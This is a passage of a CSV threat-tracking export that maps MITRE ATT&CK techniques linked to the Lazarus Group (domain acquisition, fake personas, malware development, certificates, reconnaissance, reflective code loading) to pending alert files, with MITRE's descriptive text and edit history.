January 2022)  The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",https://attack.mitre.org/techniques/T1574/013/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1583.001,Domains,Resource-Development,Pending,alerts\Lazarus_Group\T1583.001_Domains.html,,APT Matrix Generator,"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.  Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute ""IDN homograph attacks,"" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)  Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique)  Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)  Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)  In addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing.(Citation: Invictus IR DangerDev 2024)",https://attack.mitre.org/techniques/T1583/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1583.006,Web Services,Resource-Development,Pending,alerts\Lazarus_Group\T1583.006_Web_Services.html,,APT Matrix Generator,"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: FireEye APT29)(Citation: Hacker News GitHub Abuse 2024) By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",https://attack.mitre.org/techniques/T1583/006/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1584.004,Server,Resource-Development,Pending,alerts\Lazarus_Group\T1584.004_Server.html,,APT Matrix Generator,"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.(Citation: TrendMicro EarthLusca 2022) Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.  Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.",https://attack.mitre.org/techniques/T1584/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1585.001,Social Media Accounts,Resource-Development,Pending,alerts\Lazarus_Group\T1585.001_Social_Media_Accounts.html,,APT Matrix Generator,"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)  For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.   Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",https://attack.mitre.org/techniques/T1585/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1585.002,Email Accounts,Resource-Development,Pending,alerts\Lazarus_Group\T1585.002_Email_Accounts.html,,APT Matrix Generator,"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Establishing email accounts may also allow adversaries to abuse free services – such as trial periods – to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for follow-on purposes.(Citation: Free Trial PurpleUrchin)  Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)  To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016) ",https://attack.mitre.org/techniques/T1585/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1587.001,Malware,Resource-Development,Pending,alerts\Lazarus_Group\T1587.001_Malware.html,,APT Matrix Generator,"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)  As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.  Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",https://attack.mitre.org/techniques/T1587/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1588.002,Tool,Resource-Development,Pending,alerts\Lazarus_Group\T1588.002_Tool.html,,APT Matrix Generator,"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)  Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",https://attack.mitre.org/techniques/T1588/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1588.004,Digital Certificates,Resource-Development,Pending,alerts\Lazarus_Group\T1588.004_Digital_Certificates.html,,APT Matrix Generator,"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.  Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.  Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)  After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",https://attack.mitre.org/techniques/T1588/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1589.002,Email Addresses,Reconnaissance,Pending,alerts\Lazarus_Group\T1589.002_Email_Addresses.html,,APT Matrix Generator,"Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.  Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)  Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1589/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1591,Gather Victim Org Information,Reconnaissance,Pending,alerts\Lazarus_Group\T1591_Gather_Victim_Org_Information.html,,APT Matrix Generator,"Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.  Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1591/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
T1620,Reflective Code Loading,Defense-Evasion,Pending,alerts\Lazarus_Group\T1620_Reflective_Code_Loading.html,,APT Matrix Generator,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).  Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)  Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",https://attack.mitre.org/techniques/T1620/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:19""}]"
